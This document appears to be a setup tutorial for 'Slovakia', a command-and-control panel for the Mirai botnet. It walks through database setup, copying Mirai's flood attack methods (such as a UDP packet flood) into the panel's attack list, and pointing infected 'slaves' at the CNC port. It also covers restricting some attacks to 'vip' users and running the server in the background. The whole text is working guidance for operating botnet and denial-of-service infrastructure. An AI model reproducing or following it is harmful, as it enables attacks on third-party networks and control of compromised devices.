# Tutorial

When setting up Slovakia any distribution is fine, but Debian based distributions are preferred.


# SQL Server setup
1. Install MYSQL or any other SQL server, make sure to use the **mysql_secure_installation** if available.
	Debian: $ `sudo apt update`, `sudo apt install mysql-server`, `sudo mysql_secure_installation`, `sudo mysql`
		https://www.digitalocean.com/community/tutorials/how-to-install-mysql-on-ubuntu-20-04

2. Create a new data base and give it a name. MYSQL> `create database slovakia;`, `use slovakia;`
3. Create the tables using the sql file after selecting the database you just created. **[Not required anymore, database setup is now automatic]**
4. Create a new user and give it access to the data base you just created.
	https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql
	- MYSQL> `CREATE USER 'slovidb'@'localhost' IDENTIFIED BY 'f9BwtQEmEMssSDrYhr$D';`
	- MYSQL> `GRANT ALL PRIVILEGES ON * . * TO 'slovidb'@'localhost';`
	- MYSQL> `FLUSH PRIVILEGES;`
	**Make sure you use a long and secure password! Minimum of 16 random characters** (azAZ09-_=!@) is recommended. Example: `f9BwtQEmEMssSDrYhr$D` (do not use this password). If you can make the username random too.

5. Open ./assets/config.json and set the; username, password and dbname to the relevant info.

Don't forget to flush the privileges table with MYSQL> `FLUSH PRIVILEGES;`.

# Attacks - Mirai
6. Navigate to your Mirai's attack.go file and look for a map named "attackInfoLookup"
	The line starts with: `var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{`
7. Open ./assets/attacks.json in Slovakia and clear all methods from the file (MAKE SURE ITS VALID JSON!).
8. Copy one by one each feild and fill in the required info for each attack.
	Figure **(1)** *Mirai (attack.go) list of attacks*
	```go
	"udp": AttackInfo{
		0,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"UDP Packet Flood",
	},
	```

	Figure **(2)** *Slovakia (./assets/attacks.json) list of attacks*
	```json
	{
		"id": 0,
		"name":"udp",
		"description":"UDP Packet Flood",
		"defaultPort": 0,

		"vip": false
	}
	```

	Above you can see a example of how a Mirai method would look in Slovakia. You may have noticed there is no "flags" tag in Slovakia that is because it is redundant.
	The ID refers to the attack ID as stated in Mirai's attack table. When copying just use the first value in this case the `0`.
	Name is the command/name of the attack which can be ran in the command line, either directly e.g. `udp example.com 200 25565` or via the `attack` command which will walk you through a attack.
	VIP determines if the command can only be used by "vip" members or can be ran by anyone.
	Description will be the description displayed in the "attacks" command.
	Make sure every attack has a `,` at the end of the object (after the `}`) from the last attack, but not the very last entry. **IT MUST BE VALID JSON!**
	*Please do not use a prefix characters such as `.` it is ill-advised.* *Please note all attack names should be lowercase, typing the attack on the CNC can be in capitals but it will automatically be converted to lowercase.*

9. Make sure to save. Please note this file can be updated and reloaded at anytime with out any down time, just run the command `reload` on the CNC if you are a admin.

# Getting slaves to connect
10. Open ./assets/config.json and navigate to the "server" section.
11. Change the slave port to your Mirai client's default CNC port.
12. Please note that this is a host the `:` must be the prefix, the IP/domain of the server should not be added here!
13. If you want to change the port of the CNC/admin panel modify the host under `ssh`.

# DoxyProxy support (not needed if you are not using DoxyProxy)
14. Open ./assets/doxyproxy.ini and fill in the required information.
15. Make sure you set `enabled` to `true` then restart the CNC.

# Starting the CNC
16. Starting the CNC is as simple as running any linux program, only difference is that its a server thus needs to run in the background. "Screen" can be used for this purpose.
17. Screen can be installed by running:
	Debian based: $ `sudo apt install screen`
	RHEL based: $ `yum install screen`
18. Setting up stdout logging (highly recommended):
	Via screen: $ `screen -L -Logfile slovakia.log -S slovakia-cnc -d -m ./slovakia` (Recommended) (Debian)
	Pipes: $ `./slovakia >> slovakia.log` (Universal)
19. If you haven't already make sure to `chmod +x` all executable files.
	These can be found in; `./assets/commands/bin/` and `./slovakia`.
	*Please note all custom bin commands must have executable permissions or else they will not work.*
20. Logging in is simple, the default user is `root:changeme`. SSH port `99`.
21. Watch the video to explore new possibilities or just try mess around with the config files located in `./assets`. There are so many features it could not all possibly be documented.

# Slovakia when using a Firewall
22. If you are going to use a firewall make sure you allow the slave port and ssh port through both inbound and outbound. The database port should be blocked on all interfaces other than the loopback for security.